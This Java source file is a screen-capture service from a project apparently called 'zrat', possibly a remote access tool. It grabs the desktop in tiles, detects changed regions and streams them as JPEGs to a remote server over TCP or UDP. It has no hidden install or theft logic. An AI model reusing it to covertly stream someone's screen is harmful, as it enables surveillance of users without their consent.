package com.zrat.server.controller;

import java.awt.Graphics2D;
import java.awt.Point;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.util.HashMap;
import java.util.Map;

import org.jboss.netty.buffer.ChannelBuffer;
import org.jboss.netty.buffer.ChannelBuffers;

import com.sun.image.codec.jpeg.JPEGCodec;
import com.sun.image.codec.jpeg.JPEGEncodeParam;
import com.sun.image.codec.jpeg.JPEGImageEncoder;
import com.zrat.server.Server;
import com.zrat.server.util.Utils;
import com.zrat.transfer.model.TransferDataStruct;

public class ScreenServiceImpl extends BaseService implements ScreenService {

	private Toolkit toolkit;
	private Robot robot;
	private static final byte SPLIT_SRCEEN_X = 32;
	private static final byte SPLIT_SRCEEN_Y = 16;
	private int screen_x;
	private int screen_y;
	private static Rectangle[][] screen;
	private static BufferedImage[][] image;
	private static int[][] isScanned;
	private BufferedImage old_image;
	private static Rectangle screen_rct;
	private int width;
	private int height;
	private static ScreenServiceImpl self;
	private String id;
	private static boolean isFirstRun;

	private ScreenServiceImpl() {
		init();
	}

	public static ScreenServiceImpl getInstance() {
		if (self == null) {
			self = new ScreenServiceImpl();
		}
		return self;
	}

	private void init() {
		try {
			robot = new Robot();
		} catch (Exception e) {
			e.printStackTrace();
		}
		toolkit = Toolkit.getDefaultToolkit();

		screen_rct = new Rectangle(toolkit.getScreenSize());
		old_image = robot.createScreenCapture(screen_rct);
		image = new BufferedImage[SPLIT_SRCEEN_Y][SPLIT_SRCEEN_X];

		screen_x = toolkit.getScreenSize().width;
		screen_y = toolkit.getScreenSize().height;
		width = screen_x / SPLIT_SRCEEN_X;
		height = screen_y / SPLIT_SRCEEN_Y;
		screen = new Rectangle[SPLIT_SRCEEN_Y][SPLIT_SRCEEN_X];
		// old_image = robot.createScreenCapture(screen_rct);
		// BufferedImage tmpImage = null;
		for (int j = 0; j < SPLIT_SRCEEN_Y; j++) {
			for (int i = 0; i < SPLIT_SRCEEN_X; i++) {
				screen[j][i] = new Rectangle(i * width, j * height, width,
						height);
				// tmpImage = old_image.getSubimage(i * width, j * height,
				// width,
				// height);
				// image[j][i] = tmpImage;
			}
		}
	}

	// private void captureByPoint(int startx, int endx, int starty, int endy) {
	// for (int i = starty; i < endy; i++) {
	// for (int j = startx; j < endx; j++) {
	// captureByPoint(j,i);
	// }
	// }
	// }
	//	
	private void captureByPoint(byte x, byte y) {
		BufferedImage tmpImage = null;
		if (isScanned[y][x] == 0) {
			tmpImage = old_image.getSubimage(x * width, y * height, width,
					height);
			if (!tmpImage.equals(image[y][x])) {
				image[y][x] = tmpImage;
				isScanned[y][x] = 1;
				sendImage(x, y, tmpImage);
				captrue(y, x);
			}
		}
	}

	// private void captureFirstRow() {
	// captureByPoint(0, SPLIT_SRCEEN_X, 0, 1);
	// }
	//
	// private void captureLastRow() {
	// captureByPoint(0, SPLIT_SRCEEN_X, SPLIT_SRCEEN_Y -1 , SPLIT_SRCEEN_Y);
	// }

	public void capture() {
		long begin = System.currentTimeMillis();
		old_image = robot.createScreenCapture(screen_rct);
		
		isScanned = new int[SPLIT_SRCEEN_Y][SPLIT_SRCEEN_X];
		captrueByLine();
		long end = System.currentTimeMillis();
		System.out.println("total cost: "+ (end-begin));
	}

	private void captrue(byte celly, byte cellx) {
		for (byte a = (byte) (celly - 1 < 0 ? celly : celly - 1); a < a + 3; a++) {

			if (a >= SPLIT_SRCEEN_Y) {
				break;
			}
			for (byte b = (byte) (cellx - 1 < 0 ? cellx : cellx - 1); b < b + 3; b++) {
				if (b >= SPLIT_SRCEEN_X) {
					break;
				}
				if (isScanned[a][b] == 1) {
					continue;
				}
				captureByPoint(b, a);
			}
		}
	}

	public void captrueByLine() {
		BufferedImage tmpImage = null;
		byte topy, bottomy, leftx, rightx = 0;
		for (byte i = 0; i < SPLIT_SRCEEN_Y; i ++) {
			for (byte j = 0; j < SPLIT_SRCEEN_X; j++) {

				tmpImage = old_image.getSubimage(j * width, i * height, width,
						height);
				if (isScanned[i][j] == 0 && (image[i][j] == null
						|| !Utils.compare(tmpImage, image[i][j]))) {

					image[i][j] = tmpImage;
					isScanned[i][j] = 1;
					sendImage(j, i, tmpImage);
					
//					boolean notEnd = true;
//					leftx = j;
//					while (notEnd) {// 找到变化区域的左边界限
//
//						if (--leftx >= 0) {
//							tmpImage = old_image.getSubimage(leftx * width, i
//									* height, width, height);
//							if (image[i][leftx]==null || !Utils.compare(tmpImage, image[i][leftx])) {
//								image[i][leftx] = tmpImage;
//								isScanned[i][leftx] = 1;
//								sendImage(leftx, i, tmpImage);
//							} else {
//								notEnd = false;
//							}
//						} else {
//							notEnd = false;
//						}
//
//					}

//					notEnd = true;
//					rightx = j;
//					while (notEnd) {// 找到变化区域的右边界限
//						if (++rightx < SPLIT_SRCEEN_X) {
//							tmpImage = old_image.getSubimage(rightx * width, 
//									i * height, width, height);
//							if (image[i][rightx] ==null || !Utils.compare(tmpImage, image[i][rightx])) {
//								image[i][rightx] = tmpImage;
//								isScanned[i][rightx] = 1;
//								sendImage(rightx, i, tmpImage);
//							} else {
//								notEnd = false;
//							}
//						} else {
//							notEnd = false;
//						}
//
//					}
//
//					topy = i;
//					notEnd = true;
//					while (notEnd) {// 找到变化区域的上边界限
//						if (--topy >= 0) {
//							tmpImage = old_image.getSubimage(j * width, topy
//									* height, width, height);
//							if (image[topy][j]==null || !Utils.compare(tmpImage, image[topy][j])) {
//								image[topy][j] = tmpImage;
//								isScanned[topy][j] = 1;
//								sendImage(j, topy, tmpImage);
//							} else {
//								notEnd = false;
//							}
//						} else {
//							notEnd = false;
//						}
//
//					}
//
//					notEnd = true;
//					bottomy = i;
//					while (notEnd) {// 找到变化区域的下边界限
//						if (++bottomy < SPLIT_SRCEEN_Y) {
//
//							tmpImage = old_image.getSubimage(j * width, bottomy
//									* height, width, height);
//							if (image[bottomy][j]==null || !Utils.compare(tmpImage, image[bottomy][j])) {
//								image[bottomy][j] = tmpImage;
//								isScanned[bottomy][j] = 1;
//								sendImage(j, bottomy, tmpImage);
//							} else {
//								notEnd = false;
//							}
//						} else {
//							notEnd = false;
//
//						}
//
//					}

					

//					if (i - 1 > 0) {
//						tmpImage = old_image.getSubimage(j * width, (i - 1)
//								* height, width, height);
//
//						if (image[i - 1][j] == null
//								|| !Utils.compare(tmpImage, image[i - 1][j])) {
//							// if (image[i - 1][j].getRGB(0, 0) !=
//							// tmpImage.getRGB(0, 0)){
//							image[i - 1][j] = tmpImage;
//							isScanned[i - 1][j] = 1;
//							sendImage(j, (byte) (i - 1), tmpImage);
//						}
//
//					}
					
//					if ((i + 1) < SPLIT_SRCEEN_Y){
//						tmpImage = old_image.getSubimage(j * width, (i + 1)
//								* height, width, height);
//
//						if (image[i + 1][j] == null
//								|| !Utils.compare(tmpImage, image[i + 1][j])) {
//							// if (image[i - 1][j].getRGB(0, 0) !=
//							// tmpImage.getRGB(0, 0)){
//							image[i - 1][j] = tmpImage;
//							isScanned[i + 1][j] = 1;
//							sendImage(j, (byte) (i + 1), tmpImage);
//						}
//					}
//					
//
//					if (j - 1 > 0) {
//						tmpImage = old_image.getSubimage(j-1 * width, i
//								* height, width, height);
//
//						if (image[i][j - 1] == null
//								|| !Utils.compare(tmpImage, image[i][j - 1])) {
//							// if (image[i - 1][j].getRGB(0, 0) !=
//							// tmpImage.getRGB(0, 0)){
//							image[i][j - 1] = tmpImage;
//							isScanned[i][j - 1] = 1;
//							sendImage( (byte)(j-1), i , tmpImage);
//						}
//
//					}
//					
//					if ((j + 1) < SPLIT_SRCEEN_X){
//						tmpImage = old_image.getSubimage(j+1 * width, i
//								* height, width, height);
//
//						if (image[i][j + 1] == null
//								|| !Utils.compare(tmpImage, image[i][j + 1])) {
//							// if (image[i - 1][j].getRGB(0, 0) !=
//							// tmpImage.getRGB(0, 0)){
//							image[i][j + 1] = tmpImage;
//							isScanned[i][j + 1] = 1;
//							sendImage( (byte)(j+1), i , tmpImage);
//						}
//					}
				}
			}
		}
	}

	@SuppressWarnings("restriction")
	public void sendImage(byte x, byte y, BufferedImage image) {
		if (!Server.getChannel().isWritable())
			return;
		this.dataStruct = new TransferDataStruct(COMMAND_CAPTRUE);
		Map<String, Object> map = new HashMap<String, Object>();
		map.put(X, x);
		map.put(Y, y);
		ByteArrayOutputStream output = new ByteArrayOutputStream();
		JPEGEncodeParam param = JPEGCodec.getDefaultJPEGEncodeParam(image);
//		param.setQuality(1f, false);
		JPEGImageEncoder encoder = JPEGCodec.createJPEGEncoder(output, param);
		try {
			BufferedImage mBufferedImage = new BufferedImage(image.getWidth(), image.getHeight(),BufferedImage.TYPE_INT_RGB);
	        Graphics2D g2 = mBufferedImage.createGraphics();
	        g2.drawImage(image, 0, 0,null);
	        
			encoder.encode(mBufferedImage);
			encoder.getOutputStream().close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		map.put(IMG, output.toByteArray());
		dataStruct.setObject(map);
		Server.getChannel().write(dataStruct);
	}

	public void sendImage(BufferedImage image) {
		if (Server.getUdpChannel() != null
				&& Server.getUdpChannel().isWritable()) {
			ByteArrayOutputStream output = new ByteArrayOutputStream();
			JPEGEncodeParam param = JPEGCodec.getDefaultJPEGEncodeParam(image);
			param.setQuality(0.1f, false);
			JPEGImageEncoder encoder = JPEGCodec.createJPEGEncoder(output,
					param);
			try {
				encoder.encode(image);
				encoder.getOutputStream().close();

				ChannelBuffer buf = ChannelBuffers.wrappedBuffer(output
						.toByteArray());
				// System.out.println(buf.capacity());
				Server.getUdpChannel().write(
						buf,
						new InetSocketAddress(InetAddress
								.getByName(Server.HOST).getHostAddress(),
								Server.PORT));
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public void startSendScreen() {

		this.dataStruct = new TransferDataStruct(COMMAND_START);
		Map<String, Object> map = new HashMap<String, Object>();
		map.put(C_WIDTH, width);
		map.put(C_HEIGHT, height);
		map.put(SCREEN_WIDTH, screen_x);
		map.put(SCREEN_HEIGHT, screen_y);
		dataStruct.setObject(map);
		Server.getChannel().write(dataStruct);
	}
	
	public  void findDifferences(Point cursorPoint){

	    if (cursorPoint.x >= old_image.getWidth() || cursorPoint.x < 0 || cursorPoint.y >= old_image.getHeight() || cursorPoint.y < 0)
	    {
	        return;
	    }
	    
	    int xIndex;
	    int yIndex;
	    int blockTop;
	    int blockLeft;
	    int cursorBlockIndex = (cursorPoint.x / width) + (cursorPoint.y / height) * SPLIT_SRCEEN_X;
	    xIndex = (cursorPoint.x / width);
	    yIndex = (cursorPoint.y / height);
	    int currentIndex = 0;
	    
	    if(image[yIndex][xIndex] == null){
	    	return ;
	    }
	    
	   BufferedImage tmpImage = old_image.getSubimage(xIndex * width, yIndex * height, width,
				height);
	    if(isScanned[yIndex][xIndex] == 0 && !Utils.compare(tmpImage, image[yIndex][xIndex])){
	    	image[yIndex][xIndex] = tmpImage;
			isScanned[yIndex][xIndex] = 1;
			sendImage( (byte)xIndex,  (byte)yIndex , tmpImage);
	    }
	    
	    
	}

	public Robot getRobot() {
		return robot;
	}

	public void setRobot(Robot robot) {
		this.robot = robot;
	}

	public String getId() {
		return id;
	}

	public void setId(String id) {
		this.id = id;
	}

}
